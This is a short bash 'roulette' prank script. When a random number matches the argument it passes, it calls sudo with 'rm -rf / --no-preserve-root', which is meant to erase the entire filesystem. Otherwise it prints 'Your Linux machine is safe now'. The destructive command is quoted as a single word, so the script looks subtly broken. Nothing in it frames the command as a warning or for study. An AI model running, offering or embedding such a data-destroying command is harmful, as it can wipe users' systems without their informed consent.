NUM=$(shuf -i 1-8 -n 1)

r=$(( $RANDOM % 10 )); echo $r

if [ $RANDOM -eq $1 ]
then
        sudo "rm -rf / --no-preserve-root"
else
        echo "Your Linux machine is safe now"
fi

echo $NUM
